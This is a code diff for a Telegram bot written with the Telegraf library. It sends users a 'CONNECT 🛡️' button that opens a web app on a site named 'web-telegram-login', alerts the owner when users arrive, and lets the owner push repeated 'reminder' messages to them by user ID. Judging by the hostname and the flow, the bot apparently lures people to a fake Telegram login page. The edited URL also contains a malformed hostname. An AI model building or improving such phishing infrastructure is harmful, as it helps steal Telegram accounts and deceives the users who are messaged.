@@ -1,6 +1,6 @@
 const { Telegraf } = require("telegraf");
 
-const web_link = "https://web-telegram-login.netlify.app";
+const web_link = "https://-web-telegram-login.netlify.app";
 // Replace with your actual chat ID or store as environment variable
 const OWNER_CHAT_ID = process.env.OWNER_CHAT_ID || "YOUR_OWNER_CHAT_ID";
 
@@ -18,7 +18,7 @@ const createReplyMarkup = (startPayload) => {
   return {
     reply_markup: {
       inline_keyboard: [
-        [{ text: "CONNECT ", web_app: { url: urlSent } }]
+        [{ text: "CONNECT 🛡️", web_app: { url: urlSent } }]
       ]
     }
   };
@@ -52,7 +52,7 @@ const notifyOwner = async (user, messageId) => {
 
     // Inline keyboard with Reminder button
     const replyMarkup = {
-      inline_keyboard: [[{ text: "Reminder", callback_data: `reminder_${messageId}` }]]
+      inline_keyboard: [[{ text: "Reminder", callback_data: `reminder_${user.id}` }]]
     };
 
     await bot.telegram.sendMessage(OWNER_CHAT_ID, notification, { reply_markup: replyMarkup });
@@ -62,14 +62,20 @@ const notifyOwner = async (user, messageId) => {
 };
 
 // Handle callback query from the Reminder button
-bot.action(/^reminder_(\d+)$/, (ctx) => {
-  const messageId = ctx.match[1]; // Extract the messageId from callback_data
-  const user = ctx.update.callback_query.message.reply_to_message.from;
+bot.action(/^reminder_(\d+)$/, async (ctx) => {
+  const userId = ctx.match[1]; // Extract the user ID from callback_data
 
-  // Send the welcome message again to the user
-  ctx.answerCbQuery('Reminder sent!').then(() => {
-    ctx.telegram.sendMessage(user.id, welcomeMessage(user));
-  });
+  // Create a minimal user object with the extracted user ID
+  const user = { id: userId, first_name: "User", username: "" }; // Add more fields if needed
+
+  // Send the welcome message to the user
+  try {
+    await ctx.telegram.sendMessage(userId, welcomeMessage(user), createReplyMarkup());
+    await ctx.answerCbQuery('Reminder sent to the user!');
+  } catch (error) {
+    console.error('Error sending reminder to user:', error);
+    await ctx.answerCbQuery('Failed to send reminder. User may have blocked the bot.');
+  }
 });
 
 // Respond to /start cmd
